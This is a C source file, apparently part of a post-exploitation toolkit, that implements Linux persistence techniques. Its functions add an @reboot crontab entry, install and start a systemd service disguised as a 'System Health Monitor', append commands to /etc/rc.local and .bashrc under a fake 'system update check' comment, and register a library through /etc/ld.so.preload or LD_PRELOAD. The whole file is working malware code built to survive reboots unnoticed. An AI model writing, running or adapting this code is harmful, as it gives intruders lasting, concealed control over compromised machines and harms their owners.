/**
 * Linux persistence mechanisms
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include "../../include/postex.h"

int persist_cron(const char *name, const char *command) {
    (void)name;
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -",
             command);
    return system(cmd);
}

int persist_systemd(const char *name, const char *binary_path) {
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";

    char dir[512], path[512];
    if (geteuid() == 0) {
        snprintf(dir, sizeof(dir), "/etc/systemd/system");
    } else {
        snprintf(dir, sizeof(dir), "%s/.config/systemd/user", home);
    }
    snprintf(path, sizeof(path), "%s/%s.service", dir, name);

    char mkdir_cmd[600];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p %s", dir);
    system(mkdir_cmd);

    FILE *f = fopen(path, "w");
    if (!f) return -1;

    fprintf(f,
        "[Unit]\n"
        "Description=System Health Monitor\n"
        "\n"
        "[Service]\n"
        "ExecStart=%s\n"
        "Restart=always\n"
        "RestartSec=30\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n",
        binary_path);
    fclose(f);

    if (geteuid() == 0) {
        char enable[512];
        snprintf(enable, sizeof(enable),
                 "systemctl daemon-reload && systemctl enable %s && systemctl start %s",
                 name, name);
        return system(enable);
    }

    char enable[512];
    snprintf(enable, sizeof(enable),
             "systemctl --user daemon-reload && systemctl --user enable %s && systemctl --user start %s",
             name, name);
    return system(enable);
}

int persist_rc_local(const char *command) {
    const char *path = "/etc/rc.local";
    FILE *f = fopen(path, "a");
    if (!f) return -1;
    fprintf(f, "\n%s &\n", command);
    fclose(f);
    chmod(path, 0755);
    return 0;
}

int persist_ld_preload(const char *so_path) {
    if (geteuid() == 0) {
        FILE *f = fopen("/etc/ld.so.preload", "a");
        if (!f) return -1;
        fprintf(f, "%s\n", so_path);
        fclose(f);
        return 0;
    }

    const char *home = getenv("HOME");
    if (!home) return -1;
    char profile[512];
    snprintf(profile, sizeof(profile), "%s/.bashrc", home);
    FILE *f = fopen(profile, "a");
    if (!f) return -1;
    fprintf(f, "\nexport LD_PRELOAD=%s\n", so_path);
    fclose(f);
    return 0;
}

int persist_bashrc(const char *command) {
    const char *home = getenv("HOME");
    if (!home) home = "/root";

    char bashrc[512];
    snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", home);

    FILE *f = fopen(bashrc, "a");
    if (!f) return -1;
    fprintf(f, "\n# system update check\n(%s &) 2>/dev/null\n", command);
    fclose(f);
    return 0;
}
